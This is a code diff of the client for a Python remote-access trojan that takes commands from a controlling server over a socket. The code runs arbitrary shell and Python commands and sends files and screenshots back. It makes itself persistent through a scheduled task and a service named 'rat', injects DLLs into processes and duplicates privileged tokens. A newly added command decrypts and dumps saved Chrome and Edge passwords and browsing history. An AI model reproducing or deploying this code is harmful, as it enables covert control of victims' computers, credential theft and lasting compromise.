@@ -3,17 +3,15 @@ import inspect
 import io
 import json
 import os
-import shlex
-import shutil
 import subprocess
 import time
-from functools import wraps
 from pathlib import Path
 
-from common.util import logger, get_time, format_dict, parse, parse_args, parse_kwargs
+from client.util.decorator import desc, params, enclosing, require_admin, require_integrity
+from common.util import logger, get_time, format_dict, parse
 
 if os.name == 'nt':
-    from client.win32util import *
+    from client.util.win32util import *
 
     INTEGRITY_LEVEL = get_integrity_level()
     EXECUTABLE_PATH = get_executable_path()
@@ -22,121 +20,79 @@ if os.name == 'nt':
 UP_TIME = get_time()
 
 
-def desc(text):
-    def attr_decorator(func):
-        setattr(func, 'help', text)
-        return func
+# noinspection PyMethodMayBeStatic
+# noinspection PyUnusedLocal
+class CommandExecutor:
+    def __init__(self, socket):
+        self.socket = socket
+        self.command_id = None
 
-    return attr_decorator
-
-
-def params(arg_list):
-    def attr_decorator(func):
-        @wraps(func)
-        def wrapper(*args, **kwargs):
-            arg_dict = parse_args(arg_list, shlex.split(args[0]))
-            for key in arg_dict:
-                setattr(func, key, arg_dict[key])
-            return func(func, *args, **kwargs)
-
-        wrapper.__signature__ = inspect.signature(func)
-        return wrapper
-
-    return attr_decorator
-
-
-def params_kwargs(arg_list):
-    def attr_decorator(func):
-        @wraps(func)
-        def wrapper(*args, **kwargs):
-            arg_dict = parse_kwargs(arg_list, shlex.split(args[0]))
-            for key in arg_dict:
-                setattr(func, key, arg_dict[key])
-            return func(func, *args, **kwargs)
-
-        wrapper.__signature__ = inspect.signature(func)
-        return wrapper
-
-    return attr_decorator
-
-
-def enclosing(func):
-    def wrapper(*args):
-        nested_funcs = {k: v for k, v in func(*args).items() if callable(v)}
-        arg_str = args[0]
-        if not arg_str:
-            return 1, format_dict({k: v.help for k, v in nested_funcs.items() if hasattr(v, 'help')}, index=True)
-        cmd_name, cmd_arg = parse(arg_str)
-        nested_func = None
-        try:
-            index = int(cmd_name)
-            nested_func = list(nested_funcs.items())[index][1]
-        except (ValueError, IndexError):
-            if cmd_name in nested_funcs:
-                nested_func = nested_funcs[cmd_name]
-        finally:
-            if not nested_func:
-                return 0, f'No such function: {cmd_name}'
-            if len(inspect.getfullargspec(nested_func).args):
-                return nested_func(cmd_arg)
-            else:
-                return nested_func()
-
-    wrapper.__signature__ = inspect.signature(func)
-    return wrapper
-
-
-def require_admin(func):
-    def wrapper(*args):
-        if ctypes.windll.shell32.IsUserAnAdmin():
-            return func(*args)
+    def execute_command(self, command_id, command):
+        self.command_id = command_id
+        name, arg = parse(command)
+        if hasattr(self, name):
+            func = getattr(self, name)
+            if len(inspect.signature(func).parameters):  # inspect.ismethod(func) and
+                return func(arg)
+            return func()
         else:
-            return 0, 'Administrator rights required'
+            return self.shell(command)
 
-    wrapper.__signature__ = inspect.signature(func)
-    return wrapper
+    @desc('execute shell command')
+    def shell(self, command):
+        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                               stdin=subprocess.DEVNULL)
+        stdout = str(cmd.stdout.read(), locale.getdefaultlocale()[1])
+        stderr = str(cmd.stderr.read(), locale.getdefaultlocale()[1])
+        if stdout:
+            return 1, stdout
+        elif stderr:
+            return 0, stderr
+        else:
+            return 1, ''
 
+    def send_to_server(self, status, result, end):
+        self.socket.send_result(self.command_id, status, result, end)
 
-def require_integrity(integrity_level):
-    def attr_decorator(func):
-        @wraps(func)
-        def wrapper(*args):
-            if integrity_level == INTEGRITY_LEVEL:
-                return func(*args)
-            else:
-                return 0, f'{integrity_level} integrity level required'
+    @desc('download file')
+    def download(self, filename):
+        if os.path.isfile(filename):
+            self.socket.send_result(self.command_id, 1, 'Preparing to send file', eof=0)
+            self.socket.send_result(self.command_id, 1, 'File length is {}'.format(os.path.getsize(filename)), eof=0)
+            self.socket.send_file(self.command_id, filename)
+        else:
+            return 0, 'File does not exist'
 
-        wrapper.__signature__ = inspect.signature(func)
-        return wrapper
+    @desc('execute python code')
+    def pyexec(self, code, kwargs=None):
+        if kwargs is None:
+            kwargs = {}
+        f = io.StringIO()
+        with contextlib.redirect_stdout(f), contextlib.redirect_stderr(f):
+            exec(code, kwargs)
+        return 1, f.getvalue()
 
-    return attr_decorator
-
-
-def get_command_list():
-    return json.dumps([cmd for cmd in vars(Command) if hasattr(getattr(Command, cmd), 'help')])
-
-
-class Command:
-
-    @staticmethod
     @desc('close connection')
-    def kill(_instance):
-        _, conn = _instance
-        conn.close()
+    def kill(self):
+        self.socket.close()
         sys.exit(0)
 
-    @staticmethod
     @desc('reset connection')
-    def reset(_instance):
+    def reset(self):
         subprocess.Popen(EXECUTABLE_PATH)
-        _instance[1].close()
+        self.socket.close()
         sys.exit(0)
 
-    @staticmethod
     @desc('show this help')
-    def help():
-        return 1, format_dict(
-            {k: getattr(Command, k).help for k, v in vars(Command).items() if hasattr(getattr(Command, k), 'help')})
+    def help(self):
+        methods = {name: method for name, method in
+                   inspect.getmembers(self, lambda x: inspect.isfunction(x) or inspect.ismethod(x))
+                   if hasattr(method, 'help')}
+        return 1, format_dict({name: method.help for name, method in methods.items()})
+
+    def get_command_list(self):
+        methods = [name for name, method in inspect.getmembers(self, inspect.ismethod) if hasattr(method, 'help')]
+        return json.dumps(methods)
 
     @staticmethod
     @desc('change directory')
@@ -149,48 +105,14 @@ class Command:
         else:
             return 0, 'Cannot find the path specified'
 
-    @staticmethod
-    @desc('execute shell command')
-    def shell(command):
-        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                               stdin=subprocess.DEVNULL)
-        stdout = str(cmd.stdout.read(), locale.getdefaultlocale()[1])
-        stderr = str(cmd.stderr.read(), locale.getdefaultlocale()[1])
-        if stdout:
-            return 1, stdout
-        elif stderr:
-            return 0, stderr
-        else:
-            return 1, ''
-
-    @staticmethod
-    def run(command):
+    def run(self, command):
         if not command:
             return 0, ''
         p = subprocess.Popen(command, creationflags=subprocess.CREATE_NEW_CONSOLE)
         return 1, 'Process created: {}'.format(p.pid)
 
-    @staticmethod
-    @desc('download file')
-    def download(filename, _instance):
-        if os.path.isfile(filename):
-            id, conn = _instance
-            conn.send_result(id, 1, 'Preparing to send file', eof=0)
-            conn.send_file(id, filename)
-        else:
-            return 0, 'File does not exist'
-
-    @staticmethod
-    @desc('inject DLL into process')
-    @params(['pid', 'dll_path'])
-    def inject(this, args):
-        if not os.path.isfile(this.dll_path):
-            return 0, 'File does not exist: {}'.format(this.dll_path)
-        return create_remote_thread(int(this.pid), os.path.abspath(this.dll_path))
-
-    @staticmethod
     @desc('execute python code')
-    def pyexec(code, kwargs=None):
+    def pyexec(self, code, kwargs=None):
         if kwargs is None:
             kwargs = {}
         f = io.StringIO()
@@ -198,20 +120,20 @@ class Command:
             exec(code, kwargs)
         return 1, f.getvalue()
 
-    @staticmethod
     @desc('grab a screenshot')
-    def screenshot(_instance):
+    def screenshot(self):
+        self.send_to_server(1, 'Importing module...', 0)
         import pyautogui
-        id, conn = _instance
+        self.send_to_server(1, 'Preparing to take a screenshot...', 0)
         filename = 'screenshot_{}.png'.format(get_time())
         pyautogui.screenshot(filename)
-        conn.send_result(id, 1, 'Screenshot success', eof=0)
-        conn.send_file(id, filename)
+        self.send_to_server(1, 'Screenshot success', 0)
+        self.send_to_server(1, f'Preparing to send file, length is {os.path.getsize(filename)}', 0)
+        self.socket.send_file(self.command_id, filename)
         os.remove(filename)
 
-    @staticmethod
     @desc('get information')
-    def getinfo():
+    def getinfo(self):
         import platform
         info = {}
         try:
@@ -221,29 +143,31 @@ class Command:
             info['username'] = psutil.Process().username()
             info['integrity'] = INTEGRITY_LEVEL
             info['exec_path'] = EXECUTABLE_PATH
+            info['python_ver'] = platform.python_version()
             info['up_time'] = UP_TIME
         except Exception as e:
             logger.error(e)
         finally:
             return 1, format_dict(info)
 
-    @staticmethod
     @desc('detect user inactive time')
-    def idletime():
+    def idletime(self):
         import win32api
         return 1, 'User has been idle for: {} seconds'.format(
             (win32api.GetTickCount() - win32api.GetLastInputInfo()) / 1000.0)
 
-    @staticmethod
     @desc('perform emergency shutdown')
-    def poweroff():
+    def poweroff(self):
         ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
         ctypes.windll.ntdll.ZwShutdownSystem(2)
 
-    @staticmethod
     @desc('apply persistence mechanism')
     @enclosing
-    def persist(args):
+    def persist(self, args):
+
+        @desc('test shell')
+        def testshell(option):
+            return self.shell(option)
 
         @desc('create registry key')
         def registry(option):
@@ -267,10 +191,10 @@ class Command:
         @require_admin
         def schtasks(option):
             if not option:
-                return Command.shell(
+                return self.shell(
                     f'schtasks.exe /create /tn rat /sc onlogon /ru system /rl highest /tr "{EXECUTABLE_PATH}" /f')
             elif option == '--undo':
-                return Command.shell('schtasks.exe /delete /tn rat /f')
+                return self.shell('schtasks.exe /delete /tn rat /f')
             else:
                 return 0, 'unknown option: {}'.format(option)
 
@@ -278,18 +202,24 @@ class Command:
         @require_admin
         def service(option):
             if not option:
-                return Command.shell(f'sc create rat binpath="{EXECUTABLE_PATH}" start= auto')
+                return self.shell(f'sc create rat binpath="{EXECUTABLE_PATH}" start= auto')
             elif option == '--undo':
-                return Command.shell('sc delete rat')
+                return self.shell('sc delete rat')
             else:
                 return 0, 'unknown option: {}'.format(option)
 
         return locals()
 
-    @staticmethod
+    @desc('inject DLL into process')
+    @params('pid', 'dll_path')
+    def inject(self, this, args):
+        if not os.path.isfile(this.dll_path):
+            return 0, 'File does not exist: {}'.format(this.dll_path)
+        return create_remote_thread(int(this.pid), os.path.abspath(this.dll_path))
+
     @desc('duplicate token from process')
     @enclosing
-    def stealtoken(args):
+    def stealtoken(self, args):
         @desc('run as system')
         @require_admin
         def system():
@@ -324,6 +254,39 @@ class Command:
             return 1, 'Process created: {}'.format(pid)
 
         return locals()
+
+    @desc('extract data from browser')
+    @params('browser', 'type')
+    def browser(self, this, args):
+        home = os.path.expanduser('~')
+        profile_paths = {
+            'chrome': os.path.join(home, r'AppData\Local\Google\Chrome\User Data'),
+            'edge': os.path.join(home, r'AppData\Local\Microsoft\Edge\User Data'),
+        }
+        profile_path = profile_paths.get(this.browser)
+        if not profile_path:
+            return 0, 'Not supported: {}'.format(this.browser)
+        if not os.path.isdir(profile_path):
+            return 0, 'Not installed: {}'.format(this.browser)
+        local_state = os.path.join(profile_path, 'Local State')
+        default = os.path.join(profile_path, r'Default')
+        login_data = os.path.join(default, 'Login Data')
+        bookmarks = os.path.join(default, 'Bookmarks')
+        history = os.path.join(default, 'History')
+        if this.type == 'password':
+            return 1, json.dumps(get_chromium_passwords(get_master_key(local_state), login_data),
+                                 sort_keys=False,
+                                 indent=2,
+                                 ensure_ascii=False)
+        elif this.type == 'bookmark':
+            return 1, json.dumps(get_chromium_bookmarks(bookmarks), indent=2, ensure_ascii=False)
+        elif this.type == 'history':
+            return 1, json.dumps(get_chromium_history(history), sort_keys=False, indent=2, ensure_ascii=False)
+        else:
+            return 0, 'Error: {}'.format(this.type)
+
+"""
+class Command:
 
     @staticmethod
     @desc('elevate as admin without uac prompt')
@@ -430,37 +393,6 @@ ShortSvcName="flcVPN"
             return 1, 'success'
 
         return locals()
-
-    @staticmethod
-    @desc('extract data from browser')
-    @params(['browser', 'type'])
-    def browser(this, args):
-        home = os.path.expanduser('~')
-        profile_paths = {
-            'chrome': os.path.join(home, r'AppData\Local\Google\Chrome\User Data'),
-            'edge': os.path.join(home, r'AppData\Local\Microsoft\Edge\User Data'),
-        }
-        profile_path = profile_paths.get(this.browser)
-        if not profile_path:
-            return 0, 'Not supported: {}'.format(this.browser)
-        if not os.path.isdir(profile_path):
-            return 0, 'Not installed: {}'.format(this.browser)
-        local_state = os.path.join(profile_path, 'Local State')
-        default = os.path.join(profile_path, r'Default')
-        login_data = os.path.join(default, 'Login Data')
-        bookmarks = os.path.join(default, 'Bookmarks')
-        history = os.path.join(default, 'History')
-        if this.type == 'password':
-            return 1, json.dumps(get_chromium_passwords(get_master_key(local_state), login_data),
-                                 sort_keys=False,
-                                 indent=2,
-                                 ensure_ascii=False)
-        elif this.type == 'bookmark':
-            return 1, json.dumps(get_chromium_bookmarks(bookmarks), indent=2, ensure_ascii=False)
-        elif this.type == 'history':
-            return 1, json.dumps(get_chromium_history(history), sort_keys=False, indent=2, ensure_ascii=False)
-        else:
-            return 0, 'Error: {}'.format(this.type)
 
     @staticmethod
     @desc('prompt for credentials')
@@ -576,7 +508,7 @@ ShortSvcName="flcVPN"
         zip_name = os.path.basename(dir_name)
         pardir = pathlib.Path(dir_name).resolve().parent
         if dir_name == os.getcwd():
-            zip_name = os.path.join('..', zip_name)
+            zip_name = os.path.join('../..', zip_name)
         filename = shutil.make_archive(zip_name, format='zip', root_dir=pardir, base_dir=os.path.basename(dir_name))
         return 1, f'Archive created: {filename}'
 
@@ -589,40 +521,4 @@ ShortSvcName="flcVPN"
             return 0, f'File does not exist: {zip_name}'
         shutil.unpack_archive(zip_name, os.getcwd())
         return 1, f'Archive extracted to {os.getcwd()}'
-
-    @staticmethod
-    @params_kwargs([
-        [['url'], {'type': str, 'nargs': '*'}],
-        [['-o'], {'type': str, 'nargs': '*', 'required': False}],
-    ])
-    def web_download(this, args):
-        if not this.url:
-            return 0, 'No URL provided'
-        import requests
-        with requests.get(this.url, stream=True) as resp:
-            if resp.status_code == 200:
-                local_filename = os.path.abspath(this.o if this.o else os.path.basename(this.url))
-                with open(local_filename, 'wb') as f:
-                    shutil.copyfileobj(resp.raw, f)
-                return 1, f'File downloaded: {local_filename}'
-            else:
-                return 0, str(resp.status_code)
-
-    @staticmethod
-    @params_kwargs([
-        [['url'], {'type': str, 'nargs': '*'}],
-        [['--file', '-f'], {'type': str, 'nargs': '*', 'required': True}],
-        [['--form_data_key', '-k'], {'type': str, 'nargs': '*', 'required': False, 'default': 'file'}],
-        [['--cookies', '-c'], {'type': str, 'nargs': '*', 'required': False}]
-    ])
-    def web_upload(this, args):
-        if not this.url:
-            return 0, 'No URL provided'
-        import requests
-        filename = os.path.abspath(this.file)
-        if not os.path.isfile(filename):
-            return 0, f'File does not exist: {filename}'
-        with open(filename, 'rb') as f:
-            with requests.post(this.url, files={this.form_data_key: f},
-                               cookies=json.loads(this.cookies) if this.cookies else None) as resp:
-                return 1, resp.text
+"""
